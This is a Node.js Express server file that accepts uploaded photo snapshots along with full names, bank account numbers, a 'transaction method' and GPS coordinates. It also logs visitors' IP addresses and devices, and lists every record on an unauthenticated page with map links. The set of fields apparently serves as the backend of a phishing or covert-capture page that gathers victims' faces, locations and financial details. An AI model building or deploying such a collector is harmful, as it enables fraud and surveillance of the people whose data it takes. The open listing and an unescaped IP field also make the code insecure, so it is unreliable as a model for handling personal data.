// server.js
const express = require("express");
const path = require("path");
const fs = require("fs");
const multer = require("multer");

const app = express();
const PORT = process.env.PORT || 10000;

// ---------- Ensure uploads dir ----------
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// ---------- Multer storage for PNG snapshots ----------
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const unique = Date.now() + "-" + Math.random().toString(36).slice(2, 8);
    cb(null, `${unique}.png`);
  }
});
const upload = multer({ storage });

// ---------- Middleware ----------
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));        // /public
app.use("/files", express.static(uploadDir));                   // /files/xyz.png

// In-memory DB (resets when instance restarts)
const submissions = [];

// Get client IP (respect x-forwarded-for from Render)
function getClientIp(req) {
  const xff = req.headers["x-forwarded-for"];
  if (xff) return xff.split(",")[0].trim();
  return req.socket.remoteAddress || "unknown";
}

// ---------- Upload endpoint ----------
app.post("/upload-photo", upload.single("photo"), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).send("No photo uploaded");
    }

    const ip = getClientIp(req);
    const ua = req.headers["user-agent"] || "unknown";

    const {
      fullName,
      accountNumber,
      transactionMethod,
      latitude,
      longitude,
      accuracy
    } = req.body;

    const record = {
      timestamp: new Date().toISOString(),
      ip,
      userAgent: ua,
      fullName: fullName || "",
      accountNumber: accountNumber || "",
      method: transactionMethod || "",
      fileName: req.file.filename,
      latitude: latitude ? Number(latitude) : null,
      longitude: longitude ? Number(longitude) : null,
      accuracy: accuracy ? Number(accuracy) : null
    };

    submissions.push(record);
    console.log("Saved submission:", record);

    res.status(200).send(`Photo stored as: ${req.file.filename}`);
  } catch (err) {
    console.error("Upload error:", err);
    res.status(500).send("Server error");
  }
});

// ---------- Helpers ----------
function escapeHtml(str) {
  return String(str || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// ---------- Files list ----------
app.get("/files-list", (req, res) => {
  let html = `
  <!doctype html>
  <html>
  <head>
    <meta charset="utf-8" />
    <title>Uploaded Photos</title>
    <style>
      body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; margin: 20px; }
      h1 { margin-bottom: 16px; }
      table { border-collapse: collapse; width: 100%; max-width: 1200px; }
      th, td { border: 1px solid #ddd; padding: 8px 10px; font-size: 14px; }
      th { background: #f3f4f6; text-align: left; }
      tr:nth-child(even) { background: #f9fafb; }
      a { color: #1d4ed8; text-decoration: none; }
      a:hover { text-decoration: underline; }
      small { color: #6b7280; }
    </style>
  </head>
  <body>
    <h1>Uploaded Photos</h1>
    <table>
      <thead>
        <tr>
          <th>Timestamp (UTC)</th>
          <th>IP Address</th>
          <th>Full Name</th>
          <th>Account #</th>
          <th>Method</th>
          <th>Device (User-Agent)</th>
          <th>Location</th>
          <th>File</th>
        </tr>
      </thead>
      <tbody>
  `;

  for (const s of submissions) {
    let locationCell = "<small>Not provided</small>";
    if (s.latitude != null && s.longitude != null) {
      const coords = `${s.latitude},${s.longitude}`;
      locationCell = `
        <a href="https://www.google.com/maps?q=${encodeURIComponent(coords)}"
           target="_blank">${coords}</a><br/>
        <small>±${s.accuracy || "?"} m</small>
      `;
    }

    html += `
      <tr>
        <td>${s.timestamp}</td>
        <td>${s.ip}</td>
        <td>${escapeHtml(s.fullName)}</td>
        <td>${escapeHtml(s.accountNumber)}</td>
        <td>${escapeHtml(s.method)}</td>
        <td>${escapeHtml(s.userAgent)}</td>
        <td>${locationCell}</td>
        <td><a href="/files/${encodeURIComponent(s.fileName)}"
               target="_blank">${s.fileName}</a></td>
      </tr>
    `;
  }

  html += `
      </tbody>
    </table>
  </body>
  </html>
  `;
  res.send(html);
});

app.listen(PORT, () => {
  console.log(`Listening on ${PORT}`);
});
